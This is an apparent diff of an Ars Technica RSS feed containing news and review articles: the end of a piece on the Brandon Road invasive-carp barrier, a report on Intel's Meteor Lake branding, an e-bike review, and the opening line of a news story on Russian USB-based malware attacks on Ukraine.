+<p>Soon after that scare, Illinois and Michigan inserted items into their proposed state budgets that will pour <a href="https://www.mlive.com/public-interest/2023/02/michigan-illinois-propose-114m-toward-invasive-carp-fortifications.html">$114 million</a> into Brandon Road, covering the local match necessary to start the next tranche of federal funds flowing. (The funds from Illinois were recently signed into law, while those from Michigan have yet to be appropriated.) The barrier, previously conceived as a $778 million project, has ballooned to roughly $1.2 billion.</p>
+<p>As the project is currently envisioned, a fish moving upstream will have to negotiate a half-mile-long series of obstacles. Each of the obstacles is intended to turn back the vast majority of carp so that the number of carp diminishes to near zero as fish push upstream. If any reach the open water above the lock, the researchers believe, there will not be enough to find each other, let alone establish a breeding population. The multiple lines of defense also provide layers of redundancy in case one of the systems malfunctions.</p>
+<p>“There’s not one silver bullet that stops all fish,” said Mark Cornish, a senior technical specialist and biologist for the Army Corps, which is especially true when the waterway also has to remain open to boats and other vessels.</p>
+<p>Near the downstream entrance to the lock’s main channel, fish will encounter what Army Corps senior researcher Christa Woodley called “the first line of defense.” It is a combination of the barrier types recommended after the experimental installation at Romeoville: a thick curtain of air bubbles and an array of underwater speakers that blast noises at frequencies and volumes that drive invasive carp away.<!--adbreak--></p>
+<p>“We’re learning we’re effective. We’ve learned we have very little impact on native species, which is wonderful,” she said. "We play different patterns and frequencies all mimicking things that are in the environment and that we’ve seen affect them.”</p>
+<p>Working on a test array in the Mississippi River near Keokuk, Iowa, Woodley and her team have tagged thousands of fish and monitored their movements around the barrier’s underwater speakers. She estimated that the acoustic deterrents drive back 99.5 percent of invasive carp and that further tweaks could eventually increase that to 99.9 percent.</p>
+<p>With thousands of fish in the river, it means a few will get through. Those carp will find themselves in a reengineered channel. For several hundred yards it will be, basically, a concrete box free of anything like fish habitat. There will be no outcrops behind which fish can rest against the river’s current, no food sources, and—from the fish’s point of view—nothing enticing them forward.</p>
+  <ul class="gallery shortcode-gallery gallery-wide">
+          <li>
+        <div class="gallery-item-content">
+          <div class="gallery-image"><img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-3-980x651.jpg" alt=""></div>
+          <p>
+            Installation of a part of the electric barriers at Romeoville in 2010, after the initial barriers were constructed and activated in 2002. The site was then used to study how invasive carp respond to electric deterrents.                          [credit:
+                              <a href="https://flickr.com/photos/usacechicago/6482344737/">Jessica Vandrick/US Army</a>
+                            ]
+                      </p>
+        </div>
+      </li>
+      </ul>
+
+<p>Nonetheless, there will inevitably be a few fish adventurers who press on, and just before they reach the lock itself, they will encounter an electric deterrent much like the one tested at Romeoville. It will cause approaching fish to tingle unpleasantly and, if they push farther into the electrode array, be stunned so they can’t swim against the current. Those fish will, theoretically, be carried back downstream.</p>
+<div><a name='page-4'></a></div>
+<p>On the off chance that a few fish make it through all of that and into the lock itself, there is a second, larger acoustic array. And if any fish try to hitchhike in the space between the barges like the one rogue carp did during the Romeoville test, the lock itself is being reengineered as what is called a “flushing lock” that physically pushes even the tiniest organisms back downstream.</p>
+<p>The lock currently “creates turbulent flows,” said Cornish. “If you were a floating organism, it would swirl you around, but wouldn’t necessarily push you out of the lock. The flushing lock moves things out of the lock” and back downstream.</p>
+<p>And if, after all of that, some fish continues to fight its way against the canal current toward Lake Michigan, it will run into the electric array at Romeoville 10 miles from Brandon Road Lock and Dam—a long swim for a tired fish.</p>
+<p>As important as the barriers are, Schoenung emphasizes the impact of “non-structural components,” which is what he calls the anti-carp activities that are currently taking place.</p>
+<p>“Barriers are useful, but in conjunction with other things,” said Schoenung. “I don’t think we can discount the non-structural work that goes on in keeping the reproductive front downstream, because I don’t know that you can design a barrier that would prevent all classes of carp from getting through.”</p>
+<p><div class="image shortcode-img right medium"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-6.jpg"><img alt='There are four types of invasive carp: bighead, silver, grass, and black. In this photo, a US wildlife-management official holds bighead carp, which can weigh up to 110 pounds.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-6-300x526.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-6-640x1122.jpg 2x" alt='There are four types of invasive carp: bighead, silver, grass, and black. In this photo, a US wildlife-management official holds bighead carp, which can weigh up to 110 pounds.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-6.jpg"class="caption-link" rel="nofollow">There are four types of invasive carp: bighead, silver, grass, and black. In this photo, a US wildlife-management official holds bighead carp, which can weigh up to 110 pounds.</a> (credit: <a rel="nofollow" class="caption-link" href="https://www.britannica.com/animal/Asian-carp">USFWS</a>)</p></div>Law enforcement monitors boat ramps to make sure people comply with rules banning the movement of live fish from one place to another, either deliberately or accidentally. A significant public education campaign has raised awareness of the carp.</p>
+<p>But the most striking non-structural activity is catching carp. Up and down the Mississippi and its tributaries, carp are being pulled out of the water at a fantastic rate. In Kentucky, for example, more than 9 million pounds of carp were harvested in both 2021 and 2022. On the Illinois River downstream from Brandon Road Lock, 10 million pounds have been harvested since 2019, said Schoenung.</p>
+<p>The Illinois Department of Natural Resources has built a marketing campaign around eating invasive carp, which is popular across Asia, in hopes that consumer demand will increase commercial fishing, even rebranding the fish as “copi” (a play on the word “copious”) as part of the effort.</p>
+<p>“We’re having some measurable impact with our commercial harvest program to suppress those numbers a bit. It’s hard to quantify,” said Schoenung. “There’s a huge number of variables to take into account, and you have to ask are we better off allocating resources to remove fish, or studying the impact of removing fish? There’s not enough money to do both.”</p>
+<p>The effect of all that activity is to reduce population pressure for the carp to seek new habitat, which is important because, according to the current plan, actual construction on the project doesn’t begin until October 2024 and won’t be complete until July 2029.</p>
+<p>“We want to protect the Great Lakes as quickly as we possibly can. We try to implement the most easily constructed things as fast as we can,” said Cornish. “We want to get those things that have a likelihood of happening and working installed quickly, and work on the others. That buys us a little wiggle room.”<!--adbreak--></p>
+<p>The first phase, the installation of the bubble curtain and narrow acoustic array at the downstream entrance to the channel, will theoretically be completed in late 2026. Phase 2 will bring online the enlarged electric array and the second acoustic barrier, along with the reengineering of the lock so that it flushes fish downstream as barges pass. The final phase, which includes rebuilding the channel so it is inhospitable to passing fish, will require the temporary shutdown of barge traffic, and perhaps some blasting of bedrock to make room for improved deterrent systems. If all goes according to plan, construction will be complete in mid-summer of 2029.</p>
+<p>Today, invasive carp are regularly captured one dam downriver from Brandon Road, about 15 miles away. That is not thought to be a breeding population, however. The nearest confirmed breeding population is 55 miles downstream at Starved Rock Lock and Dam.</p>
+<p>The advance of the carp seems to have slowed. “A little bit of creep” is how Schoenung described the carp’s current movement. Schoenung attributed that to the non-structural efforts being made all over the Mississippi Basin. And the game, for now, is to buy time while the Army Corps builds its barriers.</p>
+<p>Then hope the whole thing works.</p>
+<p><em>Tom Johnson writes about technology, business, and whiskey in Louisville, Kentucky. He has written or co-written dozens of historical and military documentaries, and been published in Los Angeles, Newsday, Vineyard &amp; Winery Management, Bourbon+, and other publications.</em></p>
+<p><em>This article was originally published on <a href="https://undark.org">Undark</a>. Read the <a href="https://undark.org/2023/06/12/inside-the-race-to-build-a-1-2-billion-fish-barricade/">original article</a>.</em></p>
+
+<p><a href="https://arstechnica.com/?p=1948058&comments=1">Read Comments</a></p>]]></content:encoded>
+					
+					<wfw:commentRss>https://arstechnica.com/science/2023/06/inside-the-battle-to-build-a-1-2-billion-fish-barricade/feed/</wfw:commentRss>
+			<slash:comments>62</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>The last generation: Intel has new labels for its next major CPU architecture</title>
+		<link>https://arstechnica.com/?p=1946603</link>
+					<comments>https://arstechnica.com/gadgets/2023/06/next-gen-core-and-core-ultra-cpus-lose-an-i-as-intel-shuffles-its-branding/#comments</comments>
+		
+		<dc:creator><![CDATA[Andrew Cunningham]]></dc:creator>
+		<pubDate>Thu, 15 Jun 2023 13:00:18 +0000</pubDate>
+				<category><![CDATA[Tech]]></category>
+		<category><![CDATA[CPU]]></category>
+		<category><![CDATA[Intel]]></category>
+		<category><![CDATA[intel 14th gen]]></category>
+		<category><![CDATA[intel core]]></category>
+		<category><![CDATA[intel core i5]]></category>
+		<category><![CDATA[intel core i7]]></category>
+		<category><![CDATA[Intel Core i9]]></category>
+		<category><![CDATA[intel core ultra]]></category>
+		<category><![CDATA[intel meteor lake]]></category>
+		<category><![CDATA[meteor lake]]></category>
+		<guid isPermaLink="false">https://arstechnica.com/?p=1946603</guid>
+
+					<description><![CDATA[Intel's Meteor Lake CPUs make big changes on the surface—and under the hood.]]></description>
+										<content:encoded><![CDATA[
+<figure class="intro-image intro-left">
+  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/intel-ultra-01-1-800x450.jpeg" alt="Intel's Core CPUs are about to get a bit more Ultra."/>
+      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/intel-ultra-01-1.jpeg" class="enlarge-link" data-height="1080" data-width="1920">Enlarge</a> <span class="sep">/</span> Intel's Core CPUs are about to get a bit more Ultra. (credit: Intel)</p>  </figure>
+
+
+
+
+
+
+<div><a name='page-1'></a></div>
+<p>As part of an effort to "simplify the Intel brand portfolio," Intel has announced some changes to its processor branding starting with its next-generation Meteor Lake CPUs.</p>
+<p>The smallest change is that Intel's mainstream CPUs are losing their "i," shifting from Core i3/i5/i7/i9 to simply Core 3/5/7/9. Intel will also stop using "generational" messaging in its processor branding—none of the new CPUs will be announced, released, or advertised as "14th-generation" anything.</p>
+
+<p>Intel's generational branding has always been a bit arbitrary, anyway. The "first-generation" Core chips followed several generations of Core and Core 2 processors, the branding Intel started using for its chips in the mid-2000s at the end of the Pentium 4 era. And the Core 2 Duo and Core 2 Quad branding was used for several distinct generations of chips that used different manufacturing technologies and revised architectures.</p>
+<p>To make up for the words it's removing from its branding, Intel is also adding a new one. Its high-end chips will be called Core Ultra 5, Core Ultra 7, or Core Ultra 9. The company didn't go into detail about what makes a processor Ultra, though we do know that Core 3 chips <em>cannot<strong> </strong></em>be Ultra, while Core 9 chips can <em>only</em> be Ultra.</p>
+<div class="image shortcode-img center full"><img alt='Processors will still have a &quot;14&quot; in the model number to denote their generation.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/intel-ultra-03-scaled.jpeg" alt='Processors will still have a &quot;14&quot; in the model number to denote their generation.' ><p class="caption" style="font-size:0.8em">Processors will still have a "14" in the model number to denote their generation. (credit: Intel)</p></div>
+
+<p>Intel's CPU model numbers will continue to include generational numbering to help distinguish them from one another, and the company will continue to use suffix letters to distinguish different product segments. So what would have been an "Intel Core i7-14700K Processor" might now be an "Intel Core Ultra 7 processor 14700K" (Intel says it prefers the word "processor" to sit in between the "Core Ultra 7" part and the CPU's model number).</p>
+<p>This is part of a wider shake-up of Intel's processor branding strategy; last year, the company <a href="https://arstechnica.com/gadgets/2022/09/the-new-intel-processor-will-replace-pentium-and-celeron-cpu-branding-in-2023/">jettisoned the Pentium and Celeron brand names for low-end laptop CPUs</a>. It now refers to those Intel processors as Intel Processors. AMD has also rejiggered its laptop processor model numbers to account for the fact that it's shipping <a href="https://arstechnica.com/gadgets/2022/09/amd-is-making-laptop-cpu-model-numbers-simultaneously-less-and-more-confusing/">several different CPU and GPU pairings</a> under the same "Ryzen 7000" umbrella.</p>
+<div><a name='page-2'></a></div>
+<h2>What we know about Meteor Lake</h2>
+<p>Meteor Lake's branding change is actually probably the least important of the architecture's many changes—there are several historic firsts here, hidden among the expected CPU and GPU performance improvements.</p>
+<p>Much of what's remarkable about Meteor Lake pertains to how the chip will be manufactured and packaged. It will be Intel's first consumer CPU to use a chiplet-based design (Intel calls them "tiles"). This means Intel will be breaking its processors up into several silicon dies that use different manufacturing technologies with the goal of improving performance and efficiency.</p>
+
+<p>This comes with benefits and drawbacks—you need to make sure those tiles can communicate just as quickly as they could if they were all part of the same piece of silicon, but you can also mix and match manufacturing processes to improve performance and power efficiency while reducing costs. Intel will be using <a href="https://arstechnica.com/gadgets/2018/12/intel-introduces-foveros-3d-die-stacking-for-more-than-just-memory/">Foveros technology</a> to make Meteor Lake work; Foveros stacks chiplets directly on top of one another, facilitating quick communication between them and reducing the amount of physical space needed for packaging.</p>
+<p>The main CPU tile in Meteor Lake will continue to use a hybrid approach, combining large high-performance P-cores and small efficiency E-cores. This tile is being manufactured by Intel itself, on the company's new Intel 4 manufacturing process; current 13th-generation CPUs are made using Intel 7, which Intel has been using and refining since 2019 or so. But others, including the GPU tile, <a href="https://www.tomshardware.com/news/intel-details-3d-chip-packaging-tech-for-meteor-lake-arrow-lake-and-lunar-lake">are being manufactured by TSMC</a>, something that would have been unthinkable for Intel just a few years ago. The company's <a href="https://arstechnica.com/gadgets/2022/10/intel-a770-a750-review-strong-gpu-alternatives-that-we-very-nearly-recommend/">Arc GPUs</a> are also being manufactured by TSMC.</p>
+<p>Intel claims that it will get its manufacturing back on track in the next few years, after largely squandering the lead it had a decade ago because of trouble with its 14 nm and 10 nm processes (Intel 7 is another name for a version of its 10 nm process). It also hopes to attract third-party clients to use its chip fabs, opening up an important and <a href="https://arstechnica.com/information-technology/2023/04/intel-loses-2-8-billion-in-another-not-great-quarter-down-36-year-over-year/">much-needed</a> new revenue stream. For what it's worth, the company does seem to be <a href="https://arstechnica.com/gadgets/2021/07/intels-foundry-roadmap-lays-out-the-post-nanometer-angstrom-era/">more or less on track to hit its original deadlines</a> for the Intel 4 process, even if it is leaning on TSMC to help it get actual products to market.</p>
+<div class="image shortcode-img center full"><img alt='Meteor Lake will be Intel&#039;s first consumer CPU to use a chiplet-based approach.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/meteor-lake.jpeg" alt='Meteor Lake will be Intel&#039;s first consumer CPU to use a chiplet-based approach.' ><p class="caption" style="font-size:0.8em">Meteor Lake will be Intel's first consumer CPU to use a chiplet-based approach. (credit: Intel)</p></div>
+<p>Speaking of the TSMC-made graphics tile, Meteor Lake will be Intel's biggest GPU upgrade in years after using similar Iris Xe GPUs in the 11th, 12th, and 13th-generation chips. The Meteor Lake graphics chiplet is <a href="https://www.anandtech.com/show/17264/intel-meteor-lake-client-processors-to-use-arc-graphics-chiplets">based on the same Alchemist architecture</a> as Intel's current Arc A-series dedicated graphics cards. Among other improvements, they should hopefully bring hardware-accelerated AV1 video encoding and decoding to Intel's integrated graphics, plus ray-tracing support and <a href="https://game.intel.com/story/intel-arc-graphics-xess/">better XeSS upscaling</a>.</p>
+<p>The other big addition will be <a href="https://www.anandtech.com/show/18878/intel-discloses-new-details-on-meteor-lake-vpu-block-lays-out-vision-for-client-ai">hardware acceleration for AI workloads</a>. Generative AI has attracted a deafening amount of buzz in the last year or so, but Meteor Lake's AI acceleration will be a bit more like the "<a href="https://machinelearning.apple.com/research/neural-engine-transformers">Neural Engine</a>" that Apple has been building into its A- and M-series chips for years now, or what <a href="https://arstechnica.com/gadgets/2023/05/amd-is-ready-to-launch-its-twice-delayed-ryzen-7000-chips-for-lightweight-laptops/">AMD</a> and <a href="https://developer.qualcomm.com/software/qualcomm-neural-processing-sdk">Qualcomm</a> have included in some of their recent processors.</p>
+<p>Though it can be used for language models and <a href="https://machinelearning.apple.com/research/stable-diffusion-coreml-apple-silicon">image generation</a>, Apple has mostly used this hardware to do relatively simple, straightforward things like matching faces among photos in users' camera rolls, transcribing voicemails, and separating foreground and background objects in photos and video streams. The ability to accelerate these kinds of workloads means that more processing can be done locally on your device without sending data to be crunched on by some server somewhere, though ultimately it will probably be Microsoft that determines exactly how this hardware is used.</p>
+<div><a name='page-3'></a></div>
+<div class="image shortcode-img center full"><img alt='New Meteor Lake processors, new case stickers.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/intel-ultra-02.jpeg" alt='New Meteor Lake processors, new case stickers.' ><p class="caption" style="font-size:0.8em">New Meteor Lake processors, new case stickers. (credit: Intel)</p></div>
+<p>Desktop users may need to wait to benefit from any of these changes and improvements. Current rumors <a href="https://wccftech.com/intel-raptor-lake-refresh-cpus-reportedly-part-of-14th-gen-desktop-family/">suggest</a> that many 14th-generation desktop chips will be yet another revision of the Alder Lake architecture originally introduced in the 12th generation. The 13th-generation <a href="https://arstechnica.com/gadgets/2022/09/intels-first-13th-gen-core-cpus-include-few-surprises-but-many-cores/">Raptor Lake chips</a> improved the architecture with a larger number of E-cores, higher clock speeds, and (in some models) more cache memory. Another Alder Lake revision will probably use similar methods to increase performance, though early rumors suggest the chips will also come with increased power use, and power efficiency is already a weak point for Intel's desktop chips relative to AMD's and especially Apple's.</p>
+<p>We also don't know whether the new desktop CPUs will be compatible with previous-generation 600- and 700-series motherboards or if Intel will require a newer motherboard to meet its power requirements. That's what Intel did in the switch from 7th- to 8th-generation desktop CPUs: It kept using the same physical socket for the processors but required new motherboards with new chipsets to actually support them.</p>
+<p>Intel is expected to launch its first Meteor Lake chips, along with its branding changes, <a href="https://www.anandtech.com/show/18836/intel-meteor-lake-intel-4-process-now-ramping-for-production">in the second half of 2023</a>.</p>
+
+<p><a href="https://arstechnica.com/?p=1946603&comments=1">Read Comments</a></p>]]></content:encoded>
+					
+					<wfw:commentRss>https://arstechnica.com/gadgets/2023/06/next-gen-core-and-core-ultra-cpus-lose-an-i-as-intel-shuffles-its-branding/feed/</wfw:commentRss>
+			<slash:comments>88</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Silent, stiff, and svelte: The Tenways CGO600 Pro e-bike reviewed</title>
+		<link>https://arstechnica.com/?p=1947821</link>
+					<comments>https://arstechnica.com/cars/2023/06/silent-stiff-and-svelte-the-tenways-cgo600-pro-e-bike-reviewed/#comments</comments>
+		
+		<dc:creator><![CDATA[Eric Bangeman]]></dc:creator>
+		<pubDate>Thu, 15 Jun 2023 11:00:16 +0000</pubDate>
+				<category><![CDATA[Cars]]></category>
+		<category><![CDATA[Ars Shopping]]></category>
+		<category><![CDATA[CGO600 Pro]]></category>
+		<category><![CDATA[commuter bike]]></category>
+		<category><![CDATA[e-bikes]]></category>
+		<category><![CDATA[hybrid bike]]></category>
+		<category><![CDATA[Tenways]]></category>
+		<guid isPermaLink="false">https://arstechnica.com/?p=1947821</guid>
+
+					<description><![CDATA[The $1,899 price fits with the quality of the components and ride.]]></description>
+										<content:encoded><![CDATA[
+<figure class="intro-image intro-left">
+  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/bike-800x538.jpg" alt="Picture of a bike"/>
+      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/bike.jpg" class="enlarge-link" data-height="1076" data-width="1600">Enlarge</a> <span class="sep">/</span> The Tenways CGOPro 600 e-bike. (credit: Eric Bangeman)</p>  </figure>
+
+
+
+
+
+
+<div><a name='page-1'></a></div>
+<p class="p1">When it comes to e-bikes, sometimes less is more. That's the philosophy of Tenways, a 2-year-old Dutch e-bike manufacturer that has recently crossed the Atlantic to have a go at the US market. All four of its bikes are easy on the eyes, but the $1,899 <a href="https://fave.co/3qKUzLw" target="_blank" rel="noopener">CGO600 Pro</a> really grabbed my attention due to its sleek lines and gorgeous looks.</p>
+<p class="p1">Tenways markets the CGO600 Pro as "The Lightweight Champion." It's a 37 lb (16.8 kg) bike built to get you from point A to point B with minimal fuss—or gears, as the CGO600 Pro is a single-speed specimen. The assistance comes from a 360 W rear hub motor powered by a 36 V, 10 Ah Li-ion battery. That's good for up to 53 miles of range, a number that jibes well with my experience riding the bike. There's also no chain—the CGO600 Pro uses a carbon belt-drive system, which cuts way back on maintenance, runs quieter, and has a longer life than a chain.</p>
+<p>The CGO600 Pro really looks more like a flesh-powered hybrid than an e-bike. Absent is the chunky look of e-bikes like the <a href="https://arstechnica.com/cars/2023/01/doing-it-all-a-foldable-mountain-e-bike-with-extra-fat-tires/">Cyrusher XF690 Maxs</a> or <a href="https://arstechnica.com/cars/2022/08/no-gimmicks-no-problems-the-low-fuss-reasonably-priced-e-bike/">Velotric Discovery 1</a>. By contrast, the CGO600 Pro looks streamlined and svelte, ready to eat up the miles. The less-is-more design philosophy carries over to the LCD display, which is about the size of a Lego brick and is mounted near the handgrip on the left side of the handlebar. The downtube is slimmer than those on most e-bikes, with a removable battery accounting for the mass. The motor is located in the rear hub.</p>
+<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/assembly.jpg"><img alt='This is what you see after opening the box. Assembly went pretty smoothly, with one exception.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/assembly-640x480.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/assembly-1280x960.jpg 2x" alt='This is what you see after opening the box. Assembly went pretty smoothly, with one exception.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/assembly.jpg"class="caption-link" rel="nofollow">This is what you see after opening the box. Assembly went pretty smoothly, with one exception.</a> (credit: Eric Bangeman)</p></div>
+<p class="p1">Before I could ride the Avocado Green CGO600 Pro, I had to put it together. Tenways' assembly instructions are better and easier to follow than some of the competition's (I'll have more to say about that in a future review), and the box includes all of the hardware necessary to put the bike together.</p>
+<p class="p1">The build process was smooth, with one major exception. Getting the fenders and pedals on was a snap. Lining up the handlebars was tough and would've been easier with someone helping. Mounting the front wheel to the fork was the biggest issue. After a few frustrating moments, it dawned on me—the fork was backward, and the brake caliper was on the wrong side. I had to hit pause and ask Tenways what to do about the problem. The fix was simple: I took the handlebars off, removed a rubber grommet from the headset, loosened a screw with a hex key, spun the fork 180 degrees, and tightened it back up. The mudguards, pedals, and other assorted hardware went on without a hitch. Once I dropped the battery into the downtube and charged it, the CGO600 Pro was ready to ride.</p>
+<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/handlebars-scaled.jpg"><img alt='Those brake levers feel tiny.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/handlebars-640x480.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/handlebars-1280x960.jpg 2x" alt='Those brake levers feel tiny.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/handlebars-scaled.jpg"class="caption-link" rel="nofollow">Those brake levers feel tiny.</a> (credit: Eric Bangeman)</p></div>
+<p class="p1">Tenways bikes are all Level 2 e-bikes, so the CGO600 Pro will help you get to 20 mph (32 km/h), and you're on your own after that. There are three levels of assist, and with just a single gear available, I found myself using the highest assist level most of the time. Assist levels and all of the other controls for the bike are accessed via buttons on the small LCD display just outside the left handlebar grip. The display is easy to read, with speed and assist level evident at a glance. Its only downside is that it can be tough to read in direct sunlight, especially with sunglasses on. For rides after dark, the CGO600 Pro has a power headlight built into the headtube, which is controlled via the display.</p>
+<p>There's no throttle on the Tenways, so you'll have to at least do some cursory pedaling to get underway and up to speed.</p>
+<div><a name='page-2'></a></div>
+<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/display.jpg"><img alt='If you don&#039;t enter the password, the CGO600 Pro&#039;s motor won&#039;t activate, so it becomes a very heavy single-speed bike.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/display-640x853.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/display.jpg 2x" alt='If you don&#039;t enter the password, the CGO600 Pro&#039;s motor won&#039;t activate, so it becomes a very heavy single-speed bike.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/display.jpg"class="caption-link" rel="nofollow">If you don't enter the password, the CGO600 Pro's motor won't activate, so it becomes a very heavy single-speed bike.</a> (credit: Eric Bangeman)</p></div>
+<p class="p1">In addition to showing speed, battery power, and assist level, the display can be used to tweak some of the bike's settings. You can set a four-digit password for the bike, set the maximum assist speed to anything between 0 and 20 mph, and even check how many charging cycles the battery has undergone. It's a smart, minimalist design. Tenways also provides an app, which can track rides and offers some other limited functionality, but it's not in the same class as something like Trek Connect.</p>
+<p>One nice feature is the ability to check the charge without turning on the bike or reaching for your phone. On the left side of the battery is a small button with three colored LEDs above it that light up to indicate the amount of charge left. You can also remove the battery from the downtube for charging if you want.</p>
+<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/battery.jpg"><img alt='Checking your charge is easy. You can also unlock the battery and take it into your home for charging.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/battery-640x480.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/battery-1280x960.jpg 2x" alt='Checking your charge is easy. You can also unlock the battery and take it into your home for charging.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/battery.jpg"class="caption-link" rel="nofollow">Checking your charge is easy. You can also unlock the battery and take it into your home for charging.</a> (credit: Eric Bangeman)</p></div>
+<p class="p1">The aluminum frame, front fork, and wheels all make for a lightweight bike—and a stiff ride. In fact, I found the CGO600 Pro ride to be jarring at times. My garage is on a concrete alley that doesn't get much in the way of maintenance from the suburb I live in. So I felt every crack and missing chunk in the pavement each time I took the e-bike out for a spin. But once I was on paved roads, the ride was smooth enough. The electric motor kicked in very quickly once I began pedaling, and I enjoyed the more aggressive riding position offered by the CGO600 Pro. The belt drive made for a quiet ride as well.</p>
+<p class="p1">I wasn't so crazy about the brakes, however. The brake levers on the handlebars are small, seemingly like they were taken off a child's bike. I also had a problem with the rear hydraulic disc brake feeling very spongy and not offering much stopping power. Tenways suggested I bleed the brakes myself or take it to a bike shop and have it done there. If I went the latter route, I would be reimbursed under Tenways' warranty policy, which specifies that customers will be reimbursed if they need warranty work done at a bike shop. Unfortunately for me, my local bike shop only services e-bikes that it sells, so that's one thing to keep in mind when thinking about buying an e-bike—you may have a harder time getting repairs done than with a 100 percent human-powered bicycle.</p>
+<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/belt-drive.jpg"><img alt='The belt drive means no maintenance and a quieter ride.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/belt-drive-640x480.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/belt-drive-1280x960.jpg 2x" alt='The belt drive means no maintenance and a quieter ride.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/belt-drive.jpg"class="caption-link" rel="nofollow">The belt drive means no maintenance and a quieter ride.</a> (credit: Eric Bangeman)</p></div>
+<div><span lang="EN">    <div class="ars-component-layout ars-component-buy-box align-right">
+        <div class="ars-logo-box">
+            <div class="ars-logo-box-content ars-logo-box-content-buy-box">
+                <div class="ars-buy-box">
+                    <div class="ars-buy-box-content">
+                                                <h3 class="ars-buy-box-title">Tenways CGO600 Pro                                                </h3>
+                        <div class="ars-buy-box-button-container">
+                                                            <a class="button button-orange ars-buy-box-button noskim" href="https://fave.co/3qKUzLw" target="_blank">
+                                    $1899 at Tenways                                </a>
+                                                    </div>
+                    </div>
+                </div>
+                                <a class="ars-buy-box-overlay noskim" aria-hidden="true" href="https://fave.co/3qKUzLw" target="_blank"></a>
+                            </div>
+        </div>
+        <div class="ars-component ars-component-affiliate-disclaimer">
+            <div class="ars-affiliate-disclaimer-message">(Ars Technica may earn compensation for sales from links on this post through <a href="/affiliate-link-policy/">affiliate programs</a>.)</div>
+        </div>
+    </div>
+</span></div>
+<p>Aside from an overly stiff ride, the CGO600 Pro checks all the boxes you'd want from a commuter bike. At $1,899, there are definitely cheaper options available, such as the ~$800 <a href="https://arstechnica.com/cars/2021/11/the-swft-volt-a-minimalist-e-bike-with-a-price-to-match/">SWFT Volt</a> we reviewed in 2021. But in this case, the higher price means better components, like the strong built-in headlight, lightweight removable battery, hydraulic disc brakes, and belt drive to name a few. It's a strong contrast to cheaper e-bikes like the <a href="https://arstechnica.com/cars/2022/08/no-gimmicks-no-problems-the-low-fuss-reasonably-priced-e-bike/">Velotric Discovery 1</a>, where cheap components like lightweight plastic pedals are the norm. The CGO600 Pro may carry a price premium, but the quality of both the components and ride helps make up for that.</p>
+
+<p><a href="https://arstechnica.com/?p=1947821&comments=1">Read Comments</a></p>]]></content:encoded>
+					
+					<wfw:commentRss>https://arstechnica.com/cars/2023/06/silent-stiff-and-svelte-the-tenways-cgo600-pro-e-bike-reviewed/feed/</wfw:commentRss>
+			<slash:comments>71</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Russia-backed hackers unleash new USB-based malware on Ukraine’s military</title>
+		<link>https://arstechnica.com/?p=1947749</link>
+					<comments>https://arstechnica.com/information-technology/2023/06/russia-backed-hackers-unleash-new-usb-based-malware-on-ukraines-military/#comments</comments>
+		
+		<dc:creator><![CDATA[Dan Goodin]]></dc:creator>
+		<pubDate>Thu, 15 Jun 2023 10:30:59 +0000</pubDate>
+				<category><![CDATA[Biz & IT]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[malware]]></category>
+		<category><![CDATA[russia]]></category>
+		<category><![CDATA[shuckworm]]></category>
+		<category><![CDATA[Ukraine]]></category>
+		<guid isPermaLink="false">https://arstechnica.com/?p=1947749</guid>
+
+					<description><![CDATA[Shuckworm's relentless attacks seek intel for use in Russia's invasion of Ukraine.]]></description>
+										<content:encoded><![CDATA[
+<figure class="intro-image intro-left">
+  <img src="https://cdn.arstechnica.net/wp-content/uploads/2022/04/russia-cyber-hack-800x534.jpeg" alt="Russia-backed hackers unleash new USB-based malware on Ukraine’s military"/>
+      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2022/04/russia-cyber-hack.jpeg" class="enlarge-link" data-height="667" data-width="1000">Enlarge</a> (credit: Getty Images)</p>  </figure>
+
+
+
+
+
+
+<div><a name='page-1'></a></div>
+<p>Hackers working for Russia’s Federal Security Service have mounted multiple cyberattacks that used USB-based malware to steal large amounts of data from Ukrainian targets for use in its ongoing invasion of its smaller neighbor, researchers said.</p>
